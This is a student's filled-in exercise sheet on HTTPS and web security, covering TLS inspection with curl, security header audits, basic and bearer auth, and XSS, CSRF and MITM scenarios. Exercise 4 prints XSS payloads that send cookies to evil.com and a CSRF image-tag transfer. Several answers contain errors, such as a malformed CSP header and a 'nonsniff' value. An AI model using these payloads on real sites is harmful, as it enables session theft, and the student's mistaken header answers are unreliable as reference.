# Exercises — HTTPS & Security

## Exercise 1: Inspect TLS Connections

### 1a. Check TLS version

```bash
curl -v https://www.google.com 2>&1 | grep -i "tls\|ssl"
```

```
TLS version used: TLSv1.3
Cipher suite: TLSv1.3 / AEAD-CHACHA20-POLY1305-SHA256 / [blank] / UNDEF
```

### 1b. View certificate details

```bash
curl -v https://github.com 2>&1 | grep -A5 "Server certificate"
```

```
Certificate issuer: issuer: C=GB
Certificate subject:  subject: CN=github.com
Valid until:  Aug  2 23:59:59 2026 GMT
```

### 1c. What happens with an invalid certificate?

```bash
# Try connecting to a site with an expired certificate (test site)
curl -v https://expired.badssl.com/ 2>&1 | tail -5
```

```
What error did you get? 
More details here: https://curl.se/docs/sslcerts.html
curl failed to verify the legitimacy of the server and therefore could not establish a secure connection to it

What does this error protect you from? that the certificate for the given server is not verified

```

---

## Exercise 2: Security Headers Audit

Check security headers on these sites and fill in the table:

```bash
curl -sI https://github.com | grep -iE "strict|x-frame|x-content|content-security|referrer|permissions"
curl -sI https://www.google.com | grep -iE "strict|x-frame|x-content|content-security|referrer"
curl -sI https://httpbin.org | grep -iE "strict|x-frame|x-content|content-security|referrer"
```

| Header                    | GitHub                                     | Google                    | httpbin |
| ------------------------- | -------------------------------------------| --------------------------| ------- |
| Strict-Transport-Security |max-Age=31536000;includeSubdomains;preload  | max-age=31536000          |         |
| X-Frame-Options           |deny                                        | SAMEORIGIN                |         |
| X-Content-Type-Options    |nonsniff.                                   | text/html; charset=UTF-8  |         |
| Content-Security-Policy   |default-src  'none'                         |                           |         |
| Referrer-Policy           |origin-when-cross-origin,                   |not provided               |         |
                            strict-origin-when-cross-origin              

Content-Security-Policy-report-only:  object-src 'none';base-uri 'self';script-src 'nonce-BJYAB4JawgD1hpQm2Q9_Cg' 'strict-dynamic' 'report-sample' 'unsafe-eval' 'unsafe-inline' https: http:;report-uri https://csp.withgoogle.com/csp/gws/other-hp is for the google
Which site has the best security headers? Why?

```
Answer:

```

---

## Exercise 3: Authentication Methods

### 3a. Basic Auth

```bash
# This endpoint requires basic auth with username=naman, password=password123
curl -u naman:password123 https://httpbin.org/basic-auth/naman/password123
```
echo -n "naman:password123" | base64
Now do the same manually: 

```bash
# Encode naman:password123 in base64
echo -n "naman:password123" | base64
bmFtYW46cGFzc3dvcmQxMjM=
# Use the result in the header
curl -H "Authorization: Basic ________" https://httpbin.org/basic-auth/naman/password123
```

```
Base64 encoded value:bmFtYW46cGFzc3dvcmQxMjM=
Did it work? yes
```

### 3b. Bearer Token

```bash
curl -H "Authorization: Bearer my-secret-token-123" https://httpbin.org/bearer
```

```
What does the server respond with?
{
  "authenticated": true, 
  "token": "my-secret-token-123"
}
```

### 3c. Why is Basic Auth over HTTP dangerous?

```
Your answer: can be decoded and the in between the browser and server can be attacked by the hacker


```

---

## Exercise 4: Attack Scenarios

For each attack, explain what's happening and how to prevent it:

used HTTP not HTTPS: 
1. no Encryption, no auth that talking to the real server, Data can be tempered while browser -> attacker -> server
2. no Certificate authority: no mathematical signatures between the browser and server, no cipher suites, no trust browser cannot check the CA was signed by the server
3. no real domain name gurantee as attacker can change it

Use HTTPS: use of the TLS with latest version possible
the Chaining help the browser verify the real domain using the CA 
sigined by the server and can be calculated by the browser to verify the certificate, eg using the SHA265 and all.

Cross-Site Scripting (XSS)
The browser downloads the resources from the server like js, hmtl, css, images so the Content-Security-Policy is not defiend by the server so the attacker can inject 
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script> in the js 
or 
No HttpOnly: if the Cookie is not set to HttpOny the atacker can change the cookies or get the seesion ID using the js  and send through the same domain and verify himself as the user : can be prevented using the in the Cookie header HttpOnly 


Cross-Site Request Forgery (CSRF):
the attacker can use the imgae on its site to have you submit the cookie for the required bank and attach with it : use SameSite = strict or lax

So lets say the data is Sensitive and you want to know the Server wants to know where the request is genertaed from they Emdend the CSRF token in the HTml frontend during the transfer thing 

And avoid this all the things use the 'Origin/referer' to know which site genrated the request if same evil.com generated the request the server checks the referer or Origin if not mentioned in the server it blocks the request it


SQl Injection 
if we dont use the Paramiterized queries the attacker can attach the sql in the password or the username an =d get the required information: use the parameterized query to sql queryies

and also the input validation: if we dont verify the syntax given input like username and password attacker can attach js to maniuplate the code, use zod validataion on. also create regex validation

### 4a. You see this in a website's comment section:

```html
<script>
    document.location = "https://evil.com/steal?c=" + document.cookie;
</script>
```

```
Attack type:Cross-Site Scripting (XSS)
What does it do: inject js in the website
Prevention:use HttpOnly, Content-Security-Policy
```

### 4b. You receive an email with this hidden image:

```html
<img src="https://yourbank.com/transfer?to=attacker&amount=5000" />
```

```
Attack type: Cross-Site Request Forgery (CSRF)
What does it do:has Embended <img src="https://bank.com/transfer?to=attacker&amount=10000"> can mke trafer to the attacker
Prevention: SameSite=stricte, CSRF token, Origin/ referer to know the request generated from correct domain
```

### 4c. A public WiFi network intercepts your HTTP (not HTTPS) traffic:

```
Attack type: Man-in the Middle (MITM) attack
What can they see: whole traffic and data send over
Prevention: Use the TLS encryption (HTTPS) and never send the sensitive data over the HTTP 
```

---

## Exercise 5: Write Secure Headers

You're deploying a web application. Write the security headers you'd set:

```
# Force HTTPS for 1 year, including subdomains
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Only allow scripts from your own domain and cdn.example.com
Content-Security-Policy: defult-src=self; script-src self; 

# Prevent iframe embedding
X-Frame-Options: Deny or the given Origin only SAMEORIGIN

# Prevent MIME type sniffing
X-Content-Type-Options: nosniff

# Don't send full URL in referer for cross-origin requests
Referrer-Policy: strict-origin-when-cross-origin

# Disable camera and microphone access
Permissions-Policy: camera=(), microphone=(), geolocation=(self)
```

---

## Exercise 6: HTTPS Everywhere

Test if these sites redirect HTTP to HTTPS:

```bash
curl -sI http://github.com | grep -i "location\|HTTP/"
curl -sI http://google.com | grep -i "location\|HTTP/"
curl -sI http://httpbin.org | grep -i "location\|HTTP/"
```

| Site        | Redirects to HTTPS? | Status Code |
| ----------- | ------------------- | ----------- |
| github.com  |  https://github.com/   |     200    |
| google.com  | http://www.google.com/ |     200    |
| httpbin.org |                     |     503     |

Why is redirecting HTTP → HTTPS important?

```
Answer: in curl it doesnt redirect just gives the knew url for the given site but in the browser it redirects the url to https
its importa 

```

---

✅ **Done with exercises?** Mark `09 — HTTPS & Security` as complete in the main [README.md](../README.md)!
